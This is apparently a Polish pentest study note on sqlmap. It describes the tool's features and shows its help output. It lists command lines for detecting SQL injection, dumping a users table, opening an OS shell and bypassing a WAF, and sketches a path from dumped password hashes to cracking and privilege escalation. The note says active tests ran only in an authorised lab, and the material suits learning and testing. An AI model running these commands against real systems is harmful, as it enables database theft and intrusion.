---
title: "Sqlmap — automatyczna SQL Injection"
date: 2026-08-16
tags: [ive, e, eksploatacja, sqli, narzedzie]
category: narzedzie
status: active
---

# Sqlmap

**TL;DR**: automatyzuje wykrywanie i wykorzystywanie **SQL Injection** — od detekcji,
przez dump bazy, po shell i upload plików.

## Co to / do czego

Open-source (GPL). Python. Wysyła payloady SQLi (blind, error-based, union, time-based),
wykrywa DBMS, potem robi enumerację i eksploatację.

| Cecha | Wartość |
|-------|---------|
| Licencja | GPL |
| Język | Python 3 |
| DBMS | MySQL, PostgreSQL, MSSQL, Oracle, SQLite… |
| Możliwości | dump tabel, `--os-shell`, `--file-read/write`, WAF bypass (`--tamper`) |

## Analiza dynamiczna (2026-08-16)

**Wersja**: sqlmap **1.8.4#stable** (z warningiem "outdated" — w repo apt Ubuntu starsza wersja).

```
 ___ ___[(]_____ ___ ___  {1.8.4#stable}
Usage: python3 sqlmap [options]
  -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
  -r REQUESTFILE      Load HTTP request from a file
  -g GOOGLEDORK       Process Google dork results as target URLs
  -hh                 Show advanced help message and exit
```

Pełne zrzuty: [[Model_IVE/_analiza_dynamiczna/README]] (\`sqlmap_version.txt\`,
\`sqlmap_help.txt\` — 291 linii).

## Użycie

```bash
sqlmap -u "http://cel/vuln.php?id=1" --batch          # detekcja
sqlmap -u "http://cel/vuln.php?id=1" --dbs             # listuj bazy
sqlmap -u "http://cel/vuln.php?id=1" -D db -T users --dump   # dump tabeli
sqlmap -r request.txt --batch                          # z pliku żądania (Burp)
sqlmap -u "http://cel/x?id=1" --os-shell               # shell (jeśli da się)
sqlmap -u "http://cel/x?id=1" --tamper=space2comment   # bypass WAF
```

> ⚠️ Demo aktywnego SQLi nie było odpalane na cudzych systemach — analiza dynamiczna
> = wersja + pełny help. Aktywny test tylko na **autoryzowanym** labie (DVWA/Juice Shop,
> patrz [[Wiedza/Pentest/Burp_Suite]]).

## Wynik → cel (C)

Dump haseł → crack ([[Wiedza/Pentest/John_the_Ripper]]) → logowanie / eskalacja.

## Powiązane

- [[Model_IVE/E_Eksploatacja/E_MOC]] · [[Model_IVE/V_Podatnosci/Burp_Suite]] · [[Model_IVE/I_Informacja/Google_Dorks]]
